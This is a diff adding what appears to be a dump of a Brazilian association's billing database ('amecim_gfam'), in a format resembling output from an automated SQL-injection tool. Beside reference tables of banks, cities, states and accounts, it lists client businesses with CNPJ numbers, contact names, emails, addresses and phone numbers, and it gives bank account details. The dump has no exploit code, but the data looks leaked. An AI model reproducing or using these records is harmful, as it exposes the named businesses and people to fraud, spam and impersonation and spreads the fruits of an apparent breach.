+| 137 | NULL     | Banco VR S.A.                                           |
+| 138 | NULL     | Banco WestLB do Brasil S.A.                             |
+| 139 | NULL     | BANESTES S.A. Banco do Estado do Espírito Santo         |
+| 140 | NULL     | Banif-Banco Internacional do Funchal (Brasil)S.A.       |
+| 141 | NULL     | BankBoston N.A.                                         |
+| 142 | NULL     | Bankpar Banco Multiplo S.A.                             |
+| 143 | NULL     | BB Banco Popular do Brasil S.A.                         |
+| 144 | NULL     | BES Investimento do Brasil S.A. - Banco de Investimento |
+| 145 | NULL     | BPN Brasil Banco Mútiplo S.A.                           |
+| 146 | NULL     | BRB - Banco de Brasília S.A.                            |
+| 147 | NULL     | Caixa Econômica Federal                                 |
+| 148 | NULL     | Citibank N.A.                                           |
+| 149 | NULL     | Deutsche Bank S.A. - Banco Alemão                       |
+| 150 | NULL     | Dresdner Bank Brasil S.A. - Banco Múltiplo              |
+| 151 | NULL     | Dresdner Bank Lateinamerika Aktiengesellschaft          |
+| 152 | NULL     | Goldman Sachs do Brasil Banco Múltiplo S.A.             |
+| 153 | NULL     | Hipercard Banco Múltiplo S.A.                           |
+| 154 | NULL     | HSBC Bank Brasil S.A. - Banco Múltiplo                  |
+| 155 | NULL     | ING Bank N.V.                                           |
+| 156 | NULL     | JPMorgan Chase Bank                                     |
+| 157 | NULL     | Lemon Bank Banco Múltiplo S.A.                          |
+| 158 | NULL     | Paraná Banco S.A.                                       |
+| 159 | NULL     | UNIBANCO - União de Bancos Brasileiros S.A.             |
++-----+----------+---------------------------------------------------------+
+
+Database: amecim_gfam
+Table: cidades
+[60 entries]
++---------+-----------+---------------------------+
+| id      | id_estado | nome                      |
++---------+-----------+---------------------------+
+| 1100015 | 11        | Alta Floresta D'Oeste     |
+| 1100023 | 11        | Ariquemes                 |
+| 1100031 | 11        | Cabixi                    |
+| 1100049 | 11        | Cacoal                    |
+| 1100056 | 11        | Cerejeiras                |
+| 1100064 | 11        | Colorado do Oeste         |
+| 1100072 | 11        | Corumbiara                |
+| 1100080 | 11        | Costa Marques             |
+| 1100098 | 11        | Espigão D'Oeste           |
+| 1100106 | 11        | Guajará-Mirim             |
+| 1100114 | 11        | Jaru                      |
+| 1100122 | 11        | Ji-Paraná                 |
+| 1100130 | 11        | Machadinho D'Oeste        |
+| 1100148 | 11        | Nova Brasilândia D'Oeste  |
+| 1100155 | 11        | Ouro Preto do Oeste       |
+| 1100189 | 11        | Pimenta Bueno             |
+| 1100205 | 11        | Porto Velho               |
+| 1100254 | 11        | Presidente Médici         |
+| 1100262 | 11        | Rio Crespo                |
+| 1100288 | 11        | Rolim de Moura            |
+| 1100296 | 11        | Santa Luzia D'Oeste       |
+| 1100304 | 11        | Vilhena                   |
+| 1100320 | 11        | São Miguel do Guaporé     |
+| 1100338 | 11        | Nova Mamoré               |
+| 1100346 | 11        | Alvorada D'Oeste          |
+| 1100379 | 11        | Alto Alegre dos Parecis   |
+| 1100403 | 11        | Alto Paraíso              |
+| 1100452 | 11        | Buritis                   |
+| 1100502 | 11        | Novo Horizonte do Oeste   |
+| 1100601 | 11        | Cacaulândia               |
+| 1100700 | 11        | Campo Novo de Rondônia    |
+| 1100809 | 11        | Candeias do Jamari        |
+| 1100908 | 11        | Castanheiras              |
+| 1100924 | 11        | Chupinguaia               |
+| 1100940 | 11        | Cujubim                   |
+| 1101005 | 11        | Governador Jorge Teixeira |
+| 1101104 | 11        | Itapuã do Oeste           |
+| 1101203 | 11        | Ministro Andreazza        |
+| 1101302 | 11        | Mirante da Serra          |
+| 1101401 | 11        | Monte Negro               |
+| 1101435 | 11        | Nova União                |
+| 1101450 | 11        | Parecis                   |
+| 1101468 | 11        | Pimenteiras do Oeste      |
+| 1101476 | 11        | Primavera de Rondônia     |
+| 1101484 | 11        | São Felipe D'Oeste        |
+| 1101492 | 11        | São Francisco do Guaporé  |
+| 1101500 | 11        | Seringueiras              |
+| 1101559 | 11        | Teixeirópolis             |
+| 1101609 | 11        | Theobroma                 |
+| 1101708 | 11        | Urupá                     |
+| 1101757 | 11        | Vale do Anari             |
+| 1101807 | 11        | Vale do Paraíso           |
+| 1200013 | 12        | Acrelândia                |
+| 1200054 | 12        | Assis Brasil              |
+| 1200104 | 12        | Brasiléia                 |
+| 1200138 | 12        | Bujari                    |
+| 1200179 | 12        | Capixaba                  |
+| 1200203 | 12        | Cruzeiro do Sul           |
+| 1200252 | 12        | Epitaciolândia            |
+| 1200302 | 12        | Feijó                     |
++---------+-----------+---------------------------+
+
+Database: amecim_gfam
+Table: cliente_estado_civil
+[4 entries]
++----+------------+
+| id | nome       |
++----+------------+
+| 1  | Solteiro   |
+| 2  | Casado     |
+| 3  | Divorciado |
+| 4  | Viúvo      |
++----+------------+
+
+Database: amecim_gfam
+Table: cliente_tipo_pessoa
+[2 entries]
++----+----------+
+| id | nome     |
++----+----------+
+| 1  | Física   |
+| 2  | Jurídica |
++----+----------+
+
+Database: amecim_gfam
+Table: clientes
+[18 entries]
++-----+----------+-------------+-------------+--------------------+------------------------+-------------------------+------+-------------------------------------------------+------+--------+-------------------------+---------------------+-------------+--------------+--------------+-------------------------------------------------+----------------+-----------------+--------------------+---------------------+
+| id  | excluido | id_endereco | id_franquia | id_forma_pagamento | id_cliente_tipo_pessoa | id_cliente_estado_civil | rg   | nome                                            | sexo | status | contato                 | cpf_cnpj            | data_acordo | valor_mensal | email_recebe | nome_fantasia                                   | dia_vencimento | data_nascimento | inscricao_estadual | data_hora_cadastro  |
++-----+----------+-------------+-------------+--------------------+------------------------+-------------------------+------+-------------------------------------------------+------+--------+-------------------------+---------------------+-------------+--------------+--------------+-------------------------------------------------+----------------+-----------------+--------------------+---------------------+
+| 367 | NULL     | 641         | 1           | 1                  | 2                      | NULL                    | NULL | Almir José Kepka  (Duda Materiais)              | NULL | 1      | Almir / Denise          | 07.173.962/0001-91  | 2015-02-07  | 50.00        | 1            | Almir José Kepka  (Duda Materiais)              | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 368 | NULL     | 642         | 1           | 1                  | 2                      | NULL                    | NULL | Armazém Menon - Merc e Lanch Menon e Poss       | NULL | 1      | Soeli / Osmair          | 02.420.027/000169   | 2016-02-07  | 50.00        | 1            | Armazém Menon - Merc e Lanch Menon e Poss       | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 369 | NULL     | 643         | 1           | 1                  | 2                      | NULL                    | NULL | Floricultura Imperial  / Vs Transportes         | NULL | 1      | Vilson /Solange         | 01.036.768/0001-88  | 2016-02-07  | 50.00        | 1            | Floricultura Imperial  / Vs Transportes         | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 370 | NULL     | 644         | 1           | 1                  | 2                      | NULL                    | NULL | Hipermassa - Itaci Ind. Com de Argamassas Lt.   | NULL | 1      | Waschington Almeida     | 10.805.816/0001-46  | 2016-04-06  | 50.00        | 1            | Hipermassa - Itaci Ind. Com de Argamassas Lt.   | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 371 | NULL     | 645         | 1           | 1                  | 2                      | NULL                    | NULL | Italogran Marmores e Granitos                   | NULL | 1      | Lucas/ luciane/ Rodrigo | 04.863.102/0001-91  | 2015-06-27  | 50.00        | 1            | Italogran Marmores e Granitos                   | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 372 | NULL     | 646         | 1           | 1                  | 2                      | NULL                    | NULL | Mauá Industria de Tintas ltda - Epp             | NULL | 1      | João Luis               | 03.660..894/0001-34 | 2015-02-04  | 50.00        | 1            | Mauá Industria de Tintas ltda - Epp             | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 373 | NULL     | 647         | 1           | 1                  | 2                      | NULL                    | NULL | Posto Mauá - Prodócimo Com de Comb ltda Me      | NULL | 1      | Kerly / Raquel          | 16.964.527/0001-76  | 2015-06-27  | 50.00        | 1            | Posto Mauá - Prodócimo Com de Comb ltda Me      | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 374 | NULL     | 648         | 1           | 1                  | 2                      | NULL                    | NULL | Ranniplast Ind e Com de Artigos Plásticos Ltda  | NULL | 1      | João Carlos             | 01.069..808/0001-98 | 2016-02-07  | 50.00        | 1            | Ranniplast Ind e Com de Artigos Plásticos Ltda  | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 375 | NULL     | 649         | 1           | 1                  | 2                      | NULL                    | NULL | Restaurante Zambonin Ltda-me                    | NULL | 1      | Ivo / Lourdes           | 08.206.735/0001-38  | 2015-02-04  | 50.00        | 1            | Restaurante Zambonin Ltda-me                    | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 376 | NULL     | 650         | 1           | 1                  | 2                      | NULL                    | NULL | Restaurante Consul 2 - Santos e Dalprá Ltda     | NULL | 1      | Claudio Santos          | 18.253.620/0001-06  | 2015-07-23  | 50.00        | 1            | Restaurante Consul 2 - Santos e Dalprá Ltda     | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 377 | NULL     | 651         | 1           | 1                  | 2                      | NULL                    | NULL | Real Fix tintas e Vernizes                      | NULL | 1      | Ailton / thiago         | 73.244.626/0003-89  | 2015-02-04  | 50.00        | 1            | Real Fix tintas e Vernizes                      | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 378 | NULL     | 652         | 1           | 1                  | 2                      | NULL                    | NULL | Rm Medeiros                                     | NULL | 1      | Raul                    | 02.019.473/0001-66  | 2015-02-04  | 50.00        | 1            | Rm Medeiros                                     | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 380 | NULL     | 654         | 1           | 1                  | 2                      | NULL                    | NULL | TANKSPAR IND E COM E RENOVAÇÃO DE IMP RO        | NULL | 1      | Ivanor /Terezinha       | 02.677.230/0001-15  | 2016-08-01  | 50.00        | 1            | TANKSPAR IND E COM E RENOVAÇÃO DE IMP RO        | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 382 | NULL     | 656         | 1           | 1                  | 2                      | NULL                    | NULL | Marmoraria Santiago                             | NULL | 1      | roberto                 | 10.457.713/0001-32  | 2017-03-07  | 50.00        | 1            | Marmoraria Santiago                             | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 383 | NULL     | 657         | 1           | 1                  | 2                      | NULL                    | NULL | Cristóvão da Rosa ( Eliza )                     | NULL | 1      | Cristóvão               | 00.678.608/0001-70  | 2017-03-07  | 50.00        | 1            | Cristóvão da Rosa ( Eliza )                     | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 384 | NULL     | 658         | 1           | 1                  | 2                      | NULL                    | NULL | Marmoarte- Pol. Em Marmores e Granitos Ltda     | NULL | 1      | João Gualberto          | 80.200.835/0001-24  | 2017-04-10  | 50.00        | 1            | Marmoarte- Pol. Em Marmores e Granitos Ltda     | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 385 | NULL     | 659         | 1           | 1                  | 2                      | NULL                    | NULL | Corgraf Gráfica e Editora                       | NULL | 1      | Vicente/Paulo           | 00.33096/0001-97    | 2017-04-25  | 50.00        | 1            | Corgraf Gráfica e Editora                       | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
+| 386 | NULL     | 660         | 1           | 1                  | 2                      | NULL                    | NULL | Induquali - Ind e Com de Eq. Prod p/ Limpeza lt | NULL | 1      | Mauricio                | 01.683.713/0001-84  | 2017-06-27  | 50.00        | 1            | Induquali - Ind e Com de Eq. Prod p/ Limpeza lt | 5              | NULL            | NULL               | 2019-01-11 09:42:58 |
++-----+----------+-------------+-------------+--------------------+------------------------+-------------------------+------+-------------------------------------------------+------+--------+-------------------------+---------------------+-------------+--------------+--------------+-------------------------------------------------+----------------+-----------------+--------------------+---------------------+
+
+Database: amecim_gfam
+Table: contas_receber_envio
+[0 entries]
++----+-------------+----------------------+------+----------------+-------------------+--------------------+
+| id | id_franquia | id_financeiro_contas | tipo | numero_remessa | data_hora_remessa | data_hora_cadastro |
++----+-------------+----------------------+------+----------------+-------------------+--------------------+
++----+-------------+----------------------+------+----------------+-------------------+--------------------+
+
+Database: amecim_gfam
+Table: endereco
+[18 entries]
++-----+---------+----------+-----------+----------------------------------------------+--------+------------------------+-----------------+------------------+----------+-----------+-------------------+------------+----------------------------------+------------+-------------+--------------------+
+| id  | cidade  | excluido | cep       | email                                        | numero | bairro                 | celular         | telefone         | latitude | longitude | comercial         | referencia | logradouro                       | observacao | complemento | data_hora_cadastro |
++-----+---------+----------+-----------+----------------------------------------------+--------+------------------------+-----------------+------------------+----------+-----------+-------------------+------------+----------------------------------+------------+-------------+--------------------+
+| 1   | 4105805 | NULL     | 83413-538 | NULL                                         | 461    | Mauá                   | (41) 99967-6472 | (41) 3666-4900   | NULL     | NULL      | NULL              | NULL       | Travessa Izaltino Bráz de Bonfim | NULL       | NULL        | NULL               |
+| 641 | 4105805 | NULL     | NULL      | Ajkmateriais@hotmail.com                     | 952    | Centro Industrial Mauá | (41)            | (41) 3666-3424   | NULL     | NULL      | (41) 99973 5908   | NULL       | Rua Aleixo Schluga               | NULL       | NULL        | NULL               |
+| 642 | 4105805 | NULL     | NULL      | armazemmenon@hotmail.com                     | 563    | Centro Industrial Mauá | (41)            | (41) 3675 7834   | NULL     | NULL      | (41) 99676472     | NULL       | Rua Judith Schluga               | NULL       | NULL        | NULL               |
+| 643 | 4105805 | NULL     | NULL      | floriculturaimperial@gmail.com               | 321    | Centro Industrial Mauá | (41)            | (41) 3562 5718   | NULL     | NULL      | (41) 41 96157609  | NULL       | Rua Ana Paula Guarda             | NULL       | NULL        | NULL               |
+| 644 | 4105805 | NULL     | NULL      | wacwb@hipermassa.com.br                      | 403    | Centro Industrial Mauá | (41)            | (41) 35561499    | NULL     | NULL      | (41) 8855 3575    | NULL       | Rua Amália Strapasson de Souza   | NULL       | NULL        | NULL               |
+| 645 | 4105805 | NULL     | NULL      | italogran@globo.com                          | 246    | Centro Industrial Mauá | (41)            | (41) 3562 1427   | NULL     | NULL      | (41) 9987 0051    | NULL       | Rua Fortunato Taverna            | NULL       | NULL        | NULL               |
+| 646 | 4105805 | NULL     | NULL      | contato@mauareciclagem.com.br                | 544    | Centro Industrial Mauá | (41)            | (41) 3675 9279   | NULL     | NULL      | (41) 41 99751023  | NULL       | Rua Giovani de Abreu Bianchinni  | NULL       | NULL        | NULL               |
+| 647 | 4105805 | NULL     | NULL      | kerly@lealcivil.com.br                       | NULL   | Centro Industrial Mauá | (41)            | (41) 3663-0021   | NULL     | NULL      | (41) 9969 0092    | NULL       | Rodov BR 116                     | NULL       | NULL        | NULL               |
+| 648 | 4105805 | NULL     | NULL      | contato@ranniplast.com.br                    | 630    | Centro Industrial Mauá | (41)            | (41) 3675 7720   | NULL     | NULL      | (41) 8418-6880    | NULL       | R Aviador Max Fontoura           | NULL       | NULL        | NULL               |
+| 649 | 4105805 | NULL     | NULL      | R_zambonin@hotmail.com                       | 563    | Centro Industrial Mauá | (41)            | (41) 3675 8469   | NULL     | NULL      | (41) 41 9650 6063 | NULL       | Rua Judith Schluga               | NULL       | NULL        | NULL               |
+| 650 | 4105805 | NULL     | NULL      | consul2@bol.com.br                           | NULL   | Centro Industrial Mauá | (41)            | 41- 99528-7754   | NULL     | NULL      | (41)              | NULL       | rodov BR 116                     | NULL       | NULL        | NULL               |
+| 651 | 4105805 | NULL     | NULL      | thiago@realfix.com.br                        | 165    | Centro Industrial Mauá | (41)            | (41)  3661-1850  | NULL     | NULL      | (41) 99986076     | NULL       | Rua Ana Paula guarda             | NULL       | NULL        | NULL               |
+| 652 | 4105805 | NULL     | NULL      | rm.medeiros@hotmail.com                      | NULL   | Centro Industrial Mauá | (41)            | (41) 3562 1197   | NULL     | NULL      | (41) 41 8464 4355 | NULL       | Rua João Matos de Almeida        | NULL       | NULL        | NULL               |
+| 653 | 4105805 | NULL     | NULL      | contato@tendasparana.com.br                  | 952    | Centro Industrial Mauá | (41)            | (41)3606  5870   | NULL     | NULL      | (41) 9276 1204    | NULL       | Rua Aviador Max Fontoura         | NULL       | NULL        | NULL               |
+| 654 | 4105805 | NULL     | NULL      | cargopar@terra.com.br                        | 588    | Centro Industrial Mauá | (41)            | (41) 3675 6697   | NULL     | NULL      | (41) 41 88931535  | NULL       | R. Amália Strapasson de Souza    | NULL       | NULL        | NULL               |
+| 655 | 4105805 | NULL     | NULL      | esquadrimad@hotmail.com                      | NULL   | Centro Industrial Mauá | (41)            | (41) 3675 6631   | NULL     | NULL      | (41)988466479     | NULL       | Rua Shirlei Boeira Souto         | NULL       | NULL        | NULL               |
+| 656 | 4105805 | NULL     | NULL      | marmorariasantiago@marmorariasantiago.com.br | 1880   | Centro Industrial Mauá | (41)            | (41) 9968 9589   | NULL     | NULL      | (41)              | NULL       | R. Alberto Bedin                 | NULL       | NULL        | NULL               |
+| 657 | 4105805 | NULL     | NULL      | cabrfmerc@gmail.com                          | 39     | Centro Industrial Mauá | (41)            | (41) 99631 1410  | NULL     | NULL      | (41)              | NULL       | Rua Paulo Pereira                | NULL       | NULL        | NULL               |
++-----+---------+----------+-----------+----------------------------------------------+--------+------------------------+-----------------+------------------+----------+-----------+-------------------+------------+----------------------------------+------------+-------------+--------------------+
+
+Database: amecim_gfam
+Table: envio_cobranca
+[0 entries]
++----+----------+------------+-------------+-------------------+----------------------+---------+---------+--------------------+
+| id | id_banco | id_usuario | id_franquia | id_conta_corrente | id_finaceiros_contas | remessa | arquivo | data_hora_cadastro |
++----+----------+------------+-------------+-------------------+----------------------+---------+---------+--------------------+
++----+----------+------------+-------------+-------------------+----------------------+---------+---------+--------------------+
+
+Database: amecim_gfam
+Table: estados
+[27 entries]
++----+---------------------+-------+
+| id | nome                | sigla |
++----+---------------------+-------+
+| 11 | Rondônia            | RO    |
+| 12 | Acre                | AC    |
+| 13 | Amazonas            | AM    |
+| 14 | Roraima             | RR    |
+| 15 | Pará                | PA    |
+| 16 | Amapá               | AP    |
+| 17 | Tocantins           | TO    |
+| 21 | Maranhão            | MA    |
+| 22 | Piauí               | PI    |
+| 23 | Ceará               | CE    |
+| 24 | Rio Grande do Norte | RN    |
+| 25 | Paraíba             | PB    |
+| 26 | Pernambuco          | PE    |
+| 27 | Alagoas             | AL    |
+| 28 | Sergipe             | SE    |
+| 29 | Bahia               | BA    |
+| 31 | Minas Gerais        | MG    |
+| 32 | Espírito Santo      | ES    |
+| 33 | Rio de Janeiro      | RJ    |
+| 35 | São Paulo           | SP    |
+| 41 | Paraná              | PR    |
+| 42 | Santa Catarina      | SC    |
+| 43 | Rio Grande do Sul   | RS    |
+| 50 | Mato Grosso do Sul  | MS    |
+| 51 | Mato Grosso         | MT    |
+| 52 | Goiás               | GO    |
+| 53 | Distrito Federal    | DF    |
++----+---------------------+-------+
+
+Database: amecim_gfam
+Table: financeiro_cliente_contribuicao
+[0 entries]
++------------+---------------------+-----+-----+------+-------+
+| id_cliente | id_financeiro_conta | ano | mes | ìd   | valor |
++------------+---------------------+-----+-----+------+-------+
++------------+---------------------+-----+-----+------+-------+
+
+Database: amecim_gfam
+Table: financeiro_configuracao
+[2 entries]
++----+-------------+-------------------+----------------------+---------------------------+-----------------+
+| id | id_franquia | id_conta_corrente | id_fornecedor_padrao | id_plano_de_contas_padrao | dias_vencimento |
++----+-------------+-------------------+----------------------+---------------------------+-----------------+
+| 1  | 1           | 1                 | 3051                 | 101                       | 5               |
+| 4  | 18          | 5                 | 7220                 | 12                        | 10              |
++----+-------------+-------------------+----------------------+---------------------------+-----------------+
+
+Database: amecim_gfam
+Table: financeiro_conta_corrente
+[2 entries]
++----+----------+----------+-------------+---------------+--------+---------+----------+-------------+--------------------------------------------------+--------------+---------------+----------------+-------------------+---------------------+
+| id | id_banco | excluido | id_franquia | nome          | conta  | agencia | carteira | saldo_atual | comentarios                                      | nosso_numero | personalizado | saldo_abertura | numero_sequencial | data_hora_cadastro  |
++----+----------+----------+-------------+---------------+--------+---------+----------+-------------+--------------------------------------------------+--------------+---------------+----------------+-------------------+---------------------+
+| 1  | 37       | NULL     | 1           | SICREDI       | 1515   | 14515   | 65165    | 80.00       | teste de conta conrrente                         | 15651        | 615651        | 0.00           | 216               | 2019-01-08 14:24:49 |
+| 2  | 147      | NULL     | 1           | CAIXA INTERNO | 222222 | 222222  | 2222     | 88.00       | VALORES DE CAIXA INTERNOS QUE ENTRAM EM ESPECIES | 2222         | 22222         | 0.00           | 2222              | 2019-01-16 17:53:24 |
++----+----------+----------+-------------+---------------+--------+---------+----------+-------------+--------------------------------------------------+--------------+---------------+----------------+-------------------+---------------------+
+
+Database: amecim_gfam
+Table: financeiro_contas
+[0 entries]
++----+----------+------------+-------------+---------------+------------------+----------------------------+------------------------------+-------+-------+----------+----------+----------+------------+-----------------+------------------+--------------------+--------------------+---------------------+
+| id | excluido | id_cliente | id_franquia | id_fornecedor | id_usuario_baixa | id_financeiro_plano_contas | id_financeiro_conta_corrente | juros | valor | parcelas | montante | desconto | tipo_conta | data_vencimento | numero_documento | data_hora_cadastro | numero_nota_fiscal | data_hora_pagamento |
++----+----------+------------+-------------+---------------+------------------+----------------------------+------------------------------+-------+-------+----------+----------+----------+------------+-----------------+------------------+--------------------+--------------------+---------------------+
++----+----------+------------+-------------+---------------+------------------+----------------------------+------------------------------+-------+-------+----------+----------+----------+------------+-----------------+------------------+--------------------+--------------------+---------------------+
+
+Database: amecim_gfam
+Table: financeiro_contas_itens
+[0 entries]
++----+----------+------------+------------+----------------------+-------+-----------+-----------------+
+| id | excluido | quantidade | id_cliente | id_financeiro_contas | valor | descricao | data_referencia |
++----+----------+------------+------------+----------------------+-------+-----------+-----------------+
++----+----------+------------+------------+----------------------+-------+-----------+-----------------+
+
+Database: amecim_gfam
+Table: financeiro_fornecedor
+[1 entry]
++----+----------+----------+------------+-------------+-------------+-------------------+-------------------------------+--------------------+-------------------------+-------+-------+---------+-------------------------+---------------------+
+| id | id_banco | excluido | favorecido | id_endereco | id_franquia | id_pagamento_tipo | id_financeiro_fornecedor_tipo | cnpj               | nome                    | conta | email | agencia | nome_fantasia           | data_hora_cadastro  |
++----+----------+----------+------------+-------------+-------------+-------------------+-------------------------------+--------------------+-------------------------+-------+-------+---------+-------------------------+---------------------+
+| 1  | 37       | NULL     | Copel      | 741         | 1           | 1                 | 1                             | 04.368.989/0001-06 | Copel Distribuição S.A. | NULL  | NULL  | NULL    | Copel Distribuição S.A. | 2019-01-16 17:59:12 |
++----+----------+----------+------------+-------------+-------------+-------------------+-------------------------------+--------------------+-------------------------+-------+-------+---------+-------------------------+---------------------+
+
+Database: amecim_gfam
+Table: financeiro_fornecedor_tipo
+[4 entries]
++----+----------+-------------+-----------------------+
+| id | excluido | id_franquia | nome                  |
++----+----------+-------------+-----------------------+
+| 1  | NULL     | 1           | Prestação de Serviços |
+| 2  | NULL     | 1           | Funcionário           |
+| 3  | NULL     | 1           | Impostos/ Taxas       |
+| 4  | NULL     | 1           | Produtos              |
++----+----------+-------------+-----------------------+
+
+Database: amecim_gfam
+Table: financeiro_pagamento_tipo
+[3 entries]
++----+----------+----------+
+| id | excluido | nome     |
++----+----------+----------+
+| 1  | NULL     | Boleto   |
+| 2  | NULL     | Depósito |
+| 3  | NULL     | Dinheiro |
++----+----------+----------+
+
+Database: amecim_gfam
+Table: financeiro_plano_contas
+[143 entries]
++-----+----------+---------------------+------+----------------------------------------------------+---------+---------------------+
+| id  | excluido | id_plano_contas_pai | tipo | nome                                               | codigo  | data_hora_cadastro  |
++-----+----------+---------------------+------+----------------------------------------------------+---------+---------------------+
+| 1   | NULL     | NULL                | S    | ATIVOS                                             | 1.      | 2019-01-08 12:54:40 |
+| 2   | NULL     | 1                   | S    | ATIVO CIRCULANTE                                   | 1.1     | 2019-01-08 12:54:40 |
+| 3   | NULL     | 2                   | S    | Disponibilidades                                   | 1.1.1   | 2019-01-08 12:54:40 |
+| 4   | NULL     | 3                   | S    | Caixa                                              | 1.1.1.1 | 2019-01-08 12:54:40 |
+| 5   | NULL     | 3                   | S    | Bancos c/ Movimento                                | 1.1.1.2 | 2019-01-08 12:54:40 |
+| 6   | NULL     | 3                   | S    | Aplicações Financeiras                             | 1.1.1.3 | 2019-01-08 12:54:40 |
+| 7   | NULL     | 2                   | S    | Créditos de atividades sociais/lazer               | 1.1.2   | 2019-01-08 12:54:40 |
+| 8   | NULL     | 7                   | S    | Mensalidades                                       | 1.1.2.1 | 2019-01-08 12:54:40 |
+| 9   | NULL     | 7                   | S    | Promoções                                          | 1.1.2.2 | 2019-01-08 12:54:40 |
+| 10  | NULL     | 7                   | S    | Bingos                                             | 1.1.2.3 | 2019-01-08 12:54:40 |
+| 11  | NULL     | 2                   | S    | Almoxarifado                                       | 1.1.3   | 2019-01-08 12:54:40 |
+| 12  | NULL     | 11                  | S    | Material de escritório                             | 1.1.3.1 | 2019-01-08 12:54:40 |
+| 13  | NULL     | 11                  | S    | Material de limpeza                                | 1.1.3.2 | 2019-01-08 12:54:40 |
+| 14  | NULL     | 11                  | S    | Material esportivo                                 | 1.1.3.3 | 2019-01-08 12:54:40 |
+| 15  | NULL     | 11                  | S    | Medicamentos                                       | 1.1.3.4 | 2019-01-08 12:54:40 |
+| 16  | NULL     | 2                   | S    | Adiantamentos a Funcionários                       | 1.1.4   | 2019-01-08 12:54:40 |
+| 17  | NULL     | 16                  | S    | Adiantamento p/ Viagens                            | 1.1.4.1 | 2019-01-08 12:54:40 |
+| 18  | NULL     | 16                  | S    | Adiantamento p/ Despesas                           | 1.1.4.2 | 2019-01-08 12:54:40 |
+| 19  | NULL     | 16                  | S    | Adiantamento de Salários                           | 1.1.4.3 | 2019-01-08 12:54:40 |
+| 20  | NULL     | 16                  | S    | Adiantamento de 13º Salário                        | 1.1.4.4 | 2019-01-08 12:54:40 |
+| 21  | NULL     | 16                  | S    | Adiantamento de Férias                             | 1.1.4.5 | 2019-01-08 12:54:40 |
+| 22  | NULL     | 2                   | S    | Adiantamentos a Terceiros                          | 1.1.5   | 2019-01-08 12:54:40 |
+| 23  | NULL     | 2                   | S    | Impostos e Contribuições a Recuperar               | 1.1.6   | 2019-01-08 12:54:40 |
+| 24  | NULL     | 23                  | S    | COFINS a Recuperar                                 | 1.1.6.1 | 2019-01-08 12:54:40 |
+| 25  | NULL     | 23                  | S    | PIS a Recuperar                                    | 1.1.6.2 | 2019-01-08 12:54:40 |
+| 26  | NULL     | 23                  | S    | CSLL a Recuperar                                   | 1.1.6.2 | 2019-01-08 12:54:40 |
+| 27  | NULL     | 2                   | S    | Despesas a Apropriar                               | 1.1.7   | 2019-01-08 12:54:40 |
+| 28  | NULL     | 27                  | S    | Prêmios de Seguros                                 | 1.1.7.1 | 2019-01-08 12:54:40 |
+| 29  | NULL     | 27                  | S    | Encargos Financeiros                               | 1.1.7.2 | 2019-01-08 12:54:40 |
+| 30  | NULL     | 27                  | S    | Assinaturas de Publicações                         | 1.1.7.3 | 2019-01-08 12:54:40 |
+| 31  | NULL     | 27                  | S    | Aluguéis e Arrendamentos                           | 1.1.7.4 | 2019-01-08 12:54:40 |
+| 32  | NULL     | 1                   | S    | ATIVO REALIZÁVEL A LONGO PRAZO                     | 1.2     | 2019-01-08 12:54:40 |
+| 33  | NULL     | 32                  | S    | Títulos a Receber                                  | 1.2.1   | 2019-01-08 12:54:40 |
+| 34  | NULL     | 33                  | S    | Créditos c/ Associados                             | 1.2.1.1 | 2019-01-08 12:54:40 |
+| 35  | NULL     | 33                  | S    | Créditos c/ Diretores                              | 1.2.1.2 | 2019-01-08 12:54:40 |
+| 36  | NULL     | 32                  | S    | Depósitos judiciais                                | 1.2.2   | 2019-01-08 12:54:40 |
+| 37  | NULL     | 1                   | S    | ATIVO PERMANENTE - INVESTIMENTOS                   | 1.3     | 2019-01-08 12:54:40 |
+| 38  | NULL     | 37                  | S    | Participações Societárias                          | 1.3.1   | 2019-01-08 12:54:40 |
+| 39  | NULL     | 1                   | S    | ATIVO IMOBILIZADO                                  | 1.4     | 2019-01-08 12:54:40 |
+| 40  | NULL     | 39                  | S    | Imóveis                                            | 1.4.1   | 2019-01-08 12:54:40 |
+| 41  | NULL     | 39                  | S    | Móveis e Utensílios                                | 1.4.2   | 2019-01-08 12:54:40 |
+| 42  | NULL     | 39                  | S    | Veículos                                           | 1.4.3   | 2019-01-08 12:54:40 |
+| 43  | NULL     | 39                  | S    | Máquinas e Equipamentos                            | 1.4.4   | 2019-01-08 12:54:40 |
+| 44  | NULL     | 39                  | S    | Recursos Naturais                                  | 1.4.5   | 2019-01-08 12:54:40 |
+| 45  | NULL     | 44                  | S    | Florestas                                          | 1.4.5.1 | 2019-01-08 12:54:40 |
+| 46  | NULL     | 39                  | S    | Marcas, Direitos e Patentes                        | 1.4.6   | 2019-01-08 12:54:40 |
+| 47  | NULL     | 46                  | S    | Direito de Uso de Telefone                         | 1.4.6.1 | 2019-01-08 12:54:40 |
+| 48  | NULL     | 39                  | S    | (-) Depreciação, Amortização e Exaustão Acumuladas | 1.4.7   | 2019-01-08 12:54:40 |
+| 49  | NULL     | 39                  | S    | Quadro de atletas                                  | 1.4.8   | 2019-01-08 12:54:40 |
+| 50  | NULL     | 49                  | S    | Atletas profissionais                              | 1.4.8.1 | 2019-01-08 12:54:40 |
+| 51  | NULL     | 49                  | S    | Atletas amadores                                   | 1.4.8.2 | 2019-01-08 12:54:40 |
+| 52  | NULL     | 1                   | S    | ATIVO DIFERIDO                                     | 1.5     | 2019-01-08 12:54:40 |
+| 53  | NULL     | 52                  | S    | Gastos Pré-Operacionais                            | 1.5.1   | 2019-01-08 12:54:40 |
+| 54  | NULL     | 53                  | S    | Formação de atletas                                | 1.5.1.1 | 2019-01-08 12:54:40 |
+| 55  | NULL     | NULL                | S    | PASSIVOS                                           | 2.      | 2019-01-08 12:54:40 |
